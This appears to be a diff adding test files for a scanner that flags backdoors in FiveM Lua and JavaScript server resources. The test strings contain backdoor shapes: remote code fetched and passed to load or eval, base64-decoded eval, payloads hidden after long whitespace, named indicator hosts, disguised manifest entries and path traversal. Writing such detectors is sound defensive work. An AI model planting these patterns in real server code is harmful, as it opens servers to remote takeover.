+  assert.ok(!fires("local f = io.open(GetResourcePath(GetCurrentResourceName()) .. '/logs.txt', 'a')", "LAB-SEC-106"));
+  assert.ok(!fires("local f = io.open(path, 'r')", "LAB-SEC-106"));
+  assert.ok(!fires("local res = GetCurrentResourceName()\nSaveResourceFile(res, 'data.json', json.encode(t), -1)", "LAB-SEC-106"));
+  assert.ok(!fires("SaveResourceFile('ox_doorlock', 'convert/x.lua', text, -1)", "LAB-SEC-106"));
+  assert.ok(!fires("local cmd = 'ls \"'\nlocal dir = io.popen(cmd .. path .. '\"')", "LAB-SEC-106"));
+});
+
+test("LAB-SEC-108: a real-shaped credential, never echoed, not a placeholder", () => {
+  const token = ["MTAy" + "x".repeat(20), "AbCdEf", "y".repeat(38)].join(".");
+  const [f] = findings(`bot_Token = "${token}"`, "LAB-SEC-108");
+  assert.equal(f.line, 1);
+  assert.ok(!f.message.includes(token));
+  assert.ok(fires(`local hook = "https://discord.com/api/webhooks/123456789012345678/${"z".repeat(68)}"`, "LAB-SEC-108"));
+  assert.ok(!fires('bot_Token = "" -- your own token', "LAB-SEC-108"));
+  assert.ok(!fires('Config.Webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK"', "LAB-SEC-108"));
+});
+
+test("CfxLua syntax parses; broken Lua still gets the text checks", () => {
+  assert.equal(securityRules("a.lua", "local x <const> = 1\nx += 1\nlocal y = a?.b\nlocal h = `hash`").parsed, true);
+  const broken = securityRules("b.lua", `if then${" ".repeat(500)}load(x)()`);
+  assert.equal(broken.parsed, false);
+  assert.ok(broken.findings.some((x) => x.code === "LAB-SEC-107"));
+});
+
+test("2026.11.1: JavaScript text checks", () => {
+  const js = (source) => securityRules("server.js", source).findings.map((f) => f.code);
+  assert.ok(js("fetch(u).then((r) => r.text()).then((t) => eval(t))").includes("LAB-SEC-111"));
+  assert.ok(js("eval(Buffer.from(data, 'base64').toString())").includes("LAB-SEC-111"));
+  const blob = "A".repeat(2000);
+  assert.ok(js(`eval(Buffer.from("${blob}", "base64").toString())`).includes("LAB-SEC-111"));
+  assert.ok(js(`eval(Buffer.from("${blob.slice(0, 700)}" +\n"${blob.slice(700, 1400)}" +\n"${blob.slice(1400)}", "base64").toString())`).includes("LAB-SEC-111"));
+  assert.ok(js("const a = [1, 2]; new Function(a.map((x) => String.fromCharCode(x ^ 7)).join(''))()").includes("LAB-SEC-111"));
+  assert.ok(!js("const x = eval('1 + 1')").includes("LAB-SEC-111"));
+  assert.ok(!js("fetch(u).then((r) => r.json()).then(console.log)").includes("LAB-SEC-111"));
+  assert.ok(js("require('child_process').exec('ls')").includes("LAB-SEC-106"));
+});
+
+test("LAB-SEC-112: Blum Panel indicators and manifest tricks, not look-alikes", () => {
+  const codes = (path, source) => securityRules(path, source).findings.map((f) => f.code);
+  assert.ok(codes("a.lua", 'local u = "https://9ns1.com/x"').includes("LAB-SEC-112"));
+  assert.ok(codes("a.js", "https.get('https://cdn.fivems.lt/bertJJ')").includes("LAB-SEC-112"));
+  assert.ok(codes("sv_main.lua", "local RESOURCE_EXCLUDE = { 'monitor' }").includes("LAB-SEC-112"));
+  for (const clean of ['local u = "https://github.net/x"', 'print("ggWP")', 'local u = "https://my5mscripts.net"', "local nullJJs, devJJx = 1, 2"]) assert.ok(!codes("a.lua", clean).includes("LAB-SEC-112"), clean);
+  const manifest = (entry) => codes("res/fxmanifest.lua", `fx_version 'cerulean'\nserver_scripts {\n  ${entry},\n}`);
+  for (const bad of [`--[[server.lua]]${" ".repeat(40)}'html/cache.js'`, "'html/.env_backup.js'", "'node_modules/.cache/babel_config.js'", "'.sync.js'"]) assert.ok(manifest(bad).includes("LAB-SEC-112"), bad);
+  for (const clean of ["'./server/main.js'", "'../shared/x.js'", "'server/*.js'", "'html/app.min.js'"]) assert.ok(!manifest(clean).includes("LAB-SEC-112"), clean);
+});
+
+test("LAB-SEC-110/101: load passed to pcall or xpcall", () => {
+  assert.ok(fires('RegisterNetEvent("x", function(id) xpcall(load, print, id) end)', "LAB-SEC-110"));
+  assert.ok(fires("PerformHttpRequest(url, function(e, d) local ok, f = pcall(load, d) end)", "LAB-SEC-101"));
+  assert.ok(!fires('RegisterNetEvent("x", function(id) pcall(print, id) end)', "LAB-SEC-110"));
+});
+
+test("LAB-SEC-112 stays precise and linear", () => {
+  const codes = (path, source) => securityRules(path, source).findings.map((f) => f.code);
+  const manifest = (entry) => codes("fxmanifest.lua", `fx_version 'cerulean'\n${entry}`);
+  for (const clean of ["files { 'web/.next/static/chunks/main.js' }", "-- see 'a/.b.js'", "--[[ 'x/.y.js' ]] server_script 'server.lua'"]) assert.ok(!manifest(clean).includes("LAB-SEC-112"), clean);
+  assert.ok(manifest(`--[==[ a[1] ]==]${" ".repeat(30)}'x.js'`).includes("LAB-SEC-112"));
+  assert.ok(!codes("a.lua", "local robertJJ = 1").includes("LAB-SEC-112"));
+  assert.ok(!codes("README.md", "credits: fivems.lt").includes("LAB-SEC-112"));
+  const start = performance.now();
+  for (const bad of ['"' + "/.a".repeat(600_000), "--[[".repeat(500_000), ('"' + "/.a".repeat(600) + "\n").repeat(1000)]) manifest(bad);
+  assert.ok(performance.now() - start < 1500);
+});
+
+```
+
+`test/zip.test.js`:
+
+```js
+import assert from "node:assert/strict";
+import { test } from "node:test";
+import { strToU8, zipSync } from "fflate";
+import { scanEntries, scanFiles, scanZip } from "../src/index.js";
+
+// Backdoor *shapes* only; none of this is real malware.
+const MANIFEST = "fx_version 'cerulean'\ngame 'gta5'\nserver_script 'server.lua'";
+const HIDDEN = `print('ok')\n${" ".repeat(7168)}local a=load(x) if a then a() end`;
+const REMOTE = "PerformHttpRequest('https://example.com/x', function(_, body) assert(load(body))() end)";
+
+test("a server archive: every resource is read and findings carry the full path", async () => {
+  const resources = Object.fromEntries(
+    Array.from({ length: 60 }, (_, i) => [
+      [`resources/[jobs]/job${i}/fxmanifest.lua`, strToU8(MANIFEST)],
+      [`resources/[jobs]/job${i}/server.lua`, strToU8(i === 59 ? HIDDEN : "print('job')")],
+    ]).flat(),
+  );
+  const report = await scanZip(zipSync(resources));
+  assert.equal(report.scanned, 120);
+  assert.equal(report.findings.length, 1);
+  assert.deepEqual([report.findings[0].code, report.findings[0].severity, report.findings[0].path, report.findings[0].line], ["LAB-SEC-107", "error", "resources/[jobs]/job59/server.lua", 2]);
+});
+
+test("JS gets the hidden-code check, Lua the loaders, and a file that doesn't parse is kept", () => {
+  const report = scanFiles({ "web/app.js": `const a = 1;${" ".repeat(600)}eval(atob(x))`, "server.lua": REMOTE, "broken.lua": "function(" });
+  assert.deepEqual(report.findings.map((f) => f.code).sort(), ["LAB-SEC-101", "LAB-SEC-107", "LAB-SEC-111"]);
+  assert.deepEqual(report.unparsed, ["broken.lua"]);
+  assert.deepEqual([report.scanned, report.javascript, report.notAnalyzed, report.verdict], [1, ["web/app.js"], 2, "hidden"]);
+});
+
+test("ordinary code is clean", () => {
+  assert.deepEqual(scanFiles({ "server.lua": "RegisterCommand('hi', function() print('hi') end)" }).findings, []);
+});
+
+test("names what it could not read: compiled Lua, escrow, nested archives, executables", async () => {
+  const report = await scanZip(
+    zipSync({
+      "a/fxmanifest.lua": strToU8(MANIFEST),
+      "a/server.lua": strToU8("\x1bLua\x54\x00"),
+      "b/client.fxap": new Uint8Array([1, 2]),
+      "b/client.lua": new Uint8Array([0xff, 0xfe, 0x00]),
+      "extras/nested.zip": new Uint8Array([1]),
+      "tools/install.bat": strToU8("echo"),
+      // Real AppleDouble metadata (magic 0x00051607) is skipped; a `._` name alone is not.
+      "__MACOSX/a/._server.lua": new Uint8Array([0, 5, 22, 7, 0, 2, 0, 0]),
+    }),
+  );
+  // Non-UTF-8 bytes are read as Latin-1 (Lua reads bytes): they don't parse, so only the text checks ran.
+  assert.deepEqual([report.unreadable, report.unparsed, report.escrowed, report.archives], [["a/server.lua"], ["b/client.lua"], ["b/"], ["extras/nested.zip"]]);
+  assert.deepEqual(report.findings.map((f) => f.code), ["LAB-PKG-004"]);
+  assert.equal(report.scanned, 1);
+  assert.equal(report.verdict, "suspicious");
+});
+
+test("paths that escape the extraction folder are reported", () => {
+  const report = scanEntries(["../evil.lua", "r/server.lua"], { "r/server.lua": "print(1)" }, { unreadable: [], skipped: [] });
+  assert.deepEqual(report.findings.map((f) => f.code), ["LAB-PKG-005"]);
+});
+
+test("what isn't a ZIP is refused", async () => {
+  await assert.rejects(scanZip(strToU8("not a zip")), { message: "invalid_zip" });
+});
+
+```
